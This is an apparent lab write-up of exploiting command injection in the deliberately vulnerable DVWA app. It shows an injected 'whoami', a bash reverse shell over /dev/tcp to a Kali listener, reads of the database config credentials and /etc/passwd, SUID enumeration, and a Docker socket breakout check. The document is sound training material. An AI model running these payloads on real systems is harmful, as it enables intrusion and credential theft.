## Phase 1 — Recon: confirming the command injection vulnerability

The DVWA Command Injection module presents a simple form that asks for an IP
address and runs a `ping` against it. Before assuming this is exploitable,
the first step is confirming that user input is actually being passed
unsanitized to a shell command, rather than being validated as a real IP
address first.

First, a normal, expected input to establish a baseline:

```
127.0.0.1
```

<img width="655" height="496" alt="image" src="https://github.com/user-attachments/assets/e56b2ac2-550f-45ab-b048-893520ff5c7f" />

This returns the expected `ping` output for localhost — confirming the
backend really does execute a system `ping` command rather than, say, using a
built-in network library. Next, append a shell metacharacter to chain a
second, unrelated command onto the input:

```
127.0.0.1; whoami
```

<details>
<summary>Payload explained</summary>

| Part | What it does |
|---|---|
| `127.0.0.1` | The expected, valid input — keeps the first command running normally so the page doesn't just error out |
| `;` | Shell command separator — on Linux, this terminates the first command and starts a new one, regardless of whether the first command succeeded |
| `whoami` | An arbitrary OS command with no relation to `ping` — if its output appears on the page, user input is being passed directly to a shell with no sanitization |

</details>

<img width="280" height="159" alt="image" src="https://github.com/user-attachments/assets/58cae92c-e6c6-4d71-9e9e-1f2f457f3752" />

If the page returns both the `ping` output **and** the result of `whoami`,
this confirms the vulnerability: the application is building a shell command
by directly concatenating user input, with no input validation or
sanitization at all. This is a classic OS Command Injection vulnerability
(CWE-78) — anything the web server's user account can run, an attacker can
now run too.

First, start a listener on Kali: 

```
nc -lvnp 4444
```

<details>
<summary>Payload explained</summary>

| Part | What it does |
|---|---|
| `nc` | Netcat — used here to catch an incoming reverse shell connection |
| `-l` | Listen mode — waits for an incoming connection instead of initiating one |
| `-v` |Verbose — prints connection status |
| `-n` |Skips DNS resolution |
| `-p 4444	` |Listens on port 4444 |

</details>

Leave that running, then submit this payload into the DVWA ping field in your browser:

```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.0.50.10/4444 0>&1'
```

<details>
<summary>Payload explained</summary>

| Part | What it does |
|---|---|
| `127.0.0.1;` | 	Same baseline input as before, chained with a second command |
| `bash -c '...'` | Runs the quoted string as a bash command |
| `bash -i` |Spawns an interactive bash shell |
| `>& /dev/tcp/10.0.50.10/4444` |Redirects both stdout and stderr into a TCP connection back to Kali on port 4444 — this is the actual reverse shell mechanism |
| `0>&1` |Redirects stdin from the same connection, so you can type commands into it |

</details>

<img width="328" height="74" alt="Screenshot 2026-11-01 101843" src="https://github.com/user-attachments/assets/7cf54349-d155-42e2-ab7b-6f5341900150" />

## Phase 3 — Enumeration for privilege escalation

With code execution established, the next step is looking for a way to
escalate beyond the low-privilege `www-data` account this shell is running
as. Rather than attempting a specific exploit blindly, enumeration starts
broad: check for sudo rights, readable files with embedded credentials, and
basic situational awareness of the box.

```
sudo -l
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `sudo -l` | Lists any commands the current user is allowed to run as another user (often root) via `sudo` — a common and very direct path to privilege escalation if misconfigured |

</details>

<details>
<summary>Click to view full output</summary>

```www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$ sudo -l
sudo -l
bash: sudo: command not found
```

</details>

```
cat /var/www/html/config/config.inc.php
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `cat /var/www/html/config/config.inc.php` | DVWA's own database configuration file — commonly contains the database username/password in plaintext, which may be reused elsewhere on the network |

</details>

<details>
<summary>Click to view full output</summary>

```www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$ cat /var/www/html/config/config.inc.php
<ities/exec$ cat /var/www/html/config/config.inc.php
<?php

# If you are having problems connecting to the MySQL database and all of the variables below are correct
# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
#   Thanks to @digininja for the fix.

# Database management system to use
$DBMS = getenv('DBMS') ?: 'MySQL';
#$DBMS = 'PGSQL'; // Currently disabled

# Database variables
#   WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup.
#   Please use a database dedicated to DVWA.
#
# If you are using MariaDB then you cannot use root, you must use create a dedicated DVWA user.
#   See README.md for more information on this.
$_DVWA = array();
$_DVWA[ 'db_server' ]   = getenv('DB_SERVER') ?: '127.0.0.1';
$_DVWA[ 'db_database' ] = getenv('DB_DATABASE') ?: 'dvwa';
$_DVWA[ 'db_user' ]     = getenv('DB_USER') ?: 'dvwa';
$_DVWA[ 'db_password' ] = getenv('DB_PASSWORD') ?: 'p@ssw0rd';
$_DVWA[ 'db_port']      = getenv('DB_PORT') ?: '3306';

# ReCAPTCHA settings
#   Used for the 'Insecure CAPTCHA' module
#   You'll need to generate your own keys at: https://www.google.com/recaptcha/admin
$_DVWA[ 'recaptcha_public_key' ]  = getenv('RECAPTCHA_PUBLIC_KEY') ?: '';
$_DVWA[ 'recaptcha_private_key' ] = getenv('RECAPTCHA_PRIVATE_KEY') ?: '';

# Default security level
#   Default value for the security level with each session.
#   The default is 'impossible'. You may wish to set this to either 'low', 'medium', 'high' or impossible'.
$_DVWA[ 'default_security_level' ] = getenv('DEFAULT_SECURITY_LEVEL') ?: 'impossible';

# Default locale
#   Default locale for the help page shown with each session.
#   The default is 'en'. You may wish to set this to either 'en' or 'zh'.
$_DVWA[ 'default_locale' ] = getenv('DEFAULT_LOCALE') ?: 'en';

# Disable authentication
#   Some tools don't like working with authentication and passing cookies around
#   so this setting lets you turn off authentication.
$_DVWA[ 'disable_authentication' ] = getenv('DISABLE_AUTHENTICATION') ?: false;

define ('MYSQL', 'mysql');
define ('SQLITE', 'sqlite');

# SQLi DB Backend
#   Use this to switch the backend database used in the SQLi and Blind SQLi labs.
#   This does not affect the backend for any other services, just these two labs.
#   If you do not understand what this means, do not change it.
$_DVWA['SQLI_DB'] = getenv('SQLI_DB') ?: MYSQL;
#$_DVWA['SQLI_DB'] = SQLITE;
#$_DVWA['SQLITE_DB'] = 'sqli.db';
```

</details>

```
find / -perm -4000 -type f 2>/dev/null
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `find / -perm -4000 -type f` | Searches the entire filesystem for files with the SUID bit set — programs that run with the file owner's privileges (often root) regardless of who executes them, a classic local privilege escalation vector |
| `2>/dev/null` | Suppresses permission-denied errors from directories this low-privilege user can't read |

</details>

<details>
<summary>Click to view full output</summary>

```?>www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$ find / -perm -4000 -type f 2>/dev/null
<lities/exec$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
```

</details>

```
cat /etc/passwd
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `cat /etc/passwd` | Lists all local user accounts on the system — useful for understanding what accounts exist and which have real login shells vs. service accounts |

</details>

<details>
<summary>Click to view full output</summary>

```www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

</details>

### Enumeration results

```
sudo -l
bash: sudo: command not found
```

No `sudo` available at all on this host — that avenue is closed.

```
cat /var/www/html/config/config.inc.php
```

This exposed DVWA's own database credentials directly in the config file:

| Setting | Value |
|---|---|
| `db_server` | `127.0.0.1` |
| `db_database` | `dvwa` |
| `db_user` | `dvwa` |
| `db_password` | `p@ssw0rd` |

Not a privilege escalation path on its own, but a real finding — plaintext
credentials in an application config file are a classic source of password
reuse elsewhere on a network.

```
find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
```

All standard system SUID binaries — nothing unusual or independently
exploitable here.

```
cat /etc/passwd
```

Only default system/service accounts present, no additional human user
accounts to target.

**Conclusion:** no local privilege escalation path exists inside this
specific container — a reasonably minimal image, consistent with realistic
hardening. Since this container's network identity sits behind
`vuln-docker-01`'s own Docker bridge rather than directly on the VULNERABLE
VLAN, the next step is checking for a container breakout path to the
underlying host itself.

The next useful check is whether this container has a path to break out to the host VM itself, which would actually be sitting on the VULNERABLE VLAN. Worth checking if the Docker socket is exposed inside the container — a very common misconfiguration that gives full host-level compromise:

```
ls -la /var/run/docker.sock
```

<details> <summary>Command explained</summary>
  
| Part | What it does |
|---|---|
| `ls -la /var/run/docker.sock` |	Checks whether the Docker daemon’s control socket is mounted inside this container — if present and writable, it means this container can control the Docker host itself, including spinning up a new privileged container to escape into the host OS |

</details>
